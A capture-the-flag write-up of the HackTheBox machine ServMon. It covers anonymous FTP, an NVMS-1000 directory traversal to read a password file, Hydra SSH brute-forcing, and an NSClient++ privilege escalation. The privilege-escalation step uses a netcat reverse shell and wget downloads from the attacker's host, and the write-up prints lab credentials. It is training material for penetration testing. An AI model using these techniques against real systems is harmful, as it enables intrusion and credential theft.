---
title: "HackTheBox - ServMon"
author: Nasrallah
description: ""
date: 2023-04-03 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, easy, tunneling, ftp, directorytraversal, rce]
img_path: /assets/img/hackthebox/machines/servmon
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [ServMon](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

![](0.png)

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.184                                                                                                                             
Host is up (0.20s latency).                                                                                                                                   
Not shown: 991 closed tcp ports (reset)                                                                                                                       
PORT     STATE SERVICE       VERSION                                                                                                                          
21/tcp   open  ftp           Microsoft ftpd                                                                                                                   
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                                                                        
|_02-28-22  07:35PM       <DIR>          Users                                                                                                                
| ftp-syst:                                                                                                                                                   
|_  SYST: Windows_NT                                                                                                                                          
22/tcp   open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)                                                                                           
| ssh-hostkey:                                                                                                                                                
|   3072 c71af681ca1778d027dbcd462a092b54 (RSA)                                                                                                               
|   256 3e63ef3b6e3e4a90f34c02e940672e42 (ECDSA)                                                                                                              
|_  256 5a48c8cd39782129effbae821d03adaf (ED25519)                                                                                                            
80/tcp   open  http                                                                                                                                           
| fingerprint-strings:                                                                                                                                        
|   GetRequest, HTTPOptions, RTSPRequest:                                                                                                                     
|     HTTP/1.1 200 OK                                                                                                                                         
|     Content-type: text/html                                                                                                                                 
|     Content-Length: 340                                                      
|     Connection: close                                                        
|     AuthInfo:                                                                
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">                              
|     <head>                                                                   
|     <title></title>                                                          
|     <script type="text/javascript">                                          
|     window.location.href = "Pages/login.htm";                  
|     </script>                                                                
|     </head>                                                                                                                                                 
|     <body>                                                                   
|     </body>                                                                  
|     </html>                                                             
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6699/tcp open  napster?
8443/tcp open  ssl/https-alt
| http-title: NSClient++
|_Requested resource was /index.html
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|_    jobs
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20 
|_Not valid after:  2021-01-13T13:24:20 
```

We found an FTP server with anonymous login allowed, SSH, HTTP, SSL, SMB and other windows services.

## FTP

Let's login to the ftp server.

```terminal
$ ftp 10.10.10.184
Connected to 10.10.10.184.
220 Microsoft FTP Service
Name (10.10.10.184:sirius): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-28-22  07:35PM       <DIR>          Users
226 Transfer complete.
ftp> cd users
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-28-22  07:36PM       <DIR>          Nadine
02-28-22  07:37PM       <DIR>          Nathan
226 Transfer complete.
ftp> ls Nadine
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-28-22  07:36PM                  168 Confidential.txt
226 Transfer complete.
ftp> ls Nathan
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-28-22  07:36PM                  182 Notes to do.txt
226 Transfer complete.
ftp> 
```

We found two files, `Confidential.txt` and `Notes to do.txt`. Let's download the files and read them.

```terminal
$ cat confidential.txt 
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine                                                                                                                                                              
$ cat Notes\ to\ do.txt 
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint               
```

We see there is a password file in `nathan`'s desktop and a publicly accessible NVMS.

## Web

Let's navigate to the web page on port 8443

![](5.png)

It's `NSClient++`, we don't have a password so we move on.

Let's check the web page on port 80.

![](1.png)

We found a login page for `NVMS-1000`, On exploit-db, we search for `NVMS-1000` and find that it is vulnerable to `Directory Traversal`

![](2.png)

## Burp

Let's fire up burp suite and test the exploit.

![](3.png)

The target is vulnerable, now let's read the password file on `nathan`'s desktop folder.

![](4.png)

We got the passwords.

# **Foothold**

## Hydra

Let's brute force ssh using the passwords we got.

```terminal
$ hydra -l nadine -P ./Passwords.txt 10.10.10.184 ssh -vv
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-29 14:59:12
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
[DATA] attacking ssh://10.10.10.184:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://nadine@10.10.10.184:22
[INFO] Successful, password authentication is supported by ssh://10.10.10.184:22
[STATUS] attack finished for 10.10.10.184 (waiting for children to complete tests)
[22][ssh] host: 10.10.10.184   login: nadine   password: L1k3B1gBut7s@W0rk
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-29 14:59:16
```

We got `nadine`'s password, let's ssh to to target now.

```terminal
 $ ssh nadine@10.10.10.184                                                                                                                                
nadine@10.10.10.184's password:                                                                                                                               
Microsoft Windows [Version 10.0.17763.864]                                                                                                                    
(c) 2018 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>whoami
servmon\nadine
```


# **Privilege Escalation**

Now that we're in, we can go to `NSClient++` folder on Program files and read the password from `nsclient.ini` file.

```terminal
nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini 
ï»¿# If you want to fill this file with all available options run the following command: 
#   nscp settings --generate --add-defaults --load-all
# If you want to activate a module and bring in all its options use:
#   nscp settings --activate-module <MODULE NAME> --add-defaults               
# For details run: nscp settings --help                                        
                                       
                                                                                                                                                              
; in flight - TODO                                                                                                                                            
[/settings/default]                                                            
                                       
; Undocumented key
password = ew2x6SsGTxjRwXOT                                                                                                                                   
                                       
; Undocumented key
allowed hosts = 127.0.0.1
                                                                               
                                       
; in flight - TODO
[/settings/NRPE/server]
                                       
; Undocumented key                                                             
ssl options = no-sslv2,no-sslv3
                                          
```

Let's log in.

![](6.png)

It's says we're not allowed, this is because the only allowed host is `127.0.0.1`.

We can make a local port forward using ssh to be able to login.

```terminal
ssh nadine@10.10.10.184 -L 8443:127.0.0.1:8443
```

![](7.png)

On exploit-db we find a Privilege escalation [exploit](https://www.exploit-db.com/exploits/46802) that `NSClient++` is vulnerable to.

![](9.png)

Let's follow the steps described in the exploit.

First we create a .bat file that has out reverse shell command.

```bash
c:\programdata\nc.exe 10.10.17.90 9001 -e cmd.exe
```

Now we upload a copy of `nc.exe` and the `.bat` file to the target.

```shell
PS C:\ProgramData> wget http://10.10.17.90/nc.exe -outfile nc.exe 
PS C:\ProgramData> wget http://10.10.17.90/evil.bat -outfile evil.bat
```

Now we got to `Settings > External Scripts > Scripts` and `Add New`.

![](8.png)

We save the changes and go to `Control` > `reload`.

Now we go to `Queries`.

![](10.png)

We choose `hack` and go to `Run`

![](11.png)

After setting up a listener we click run and we should get a shell.

![](12.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).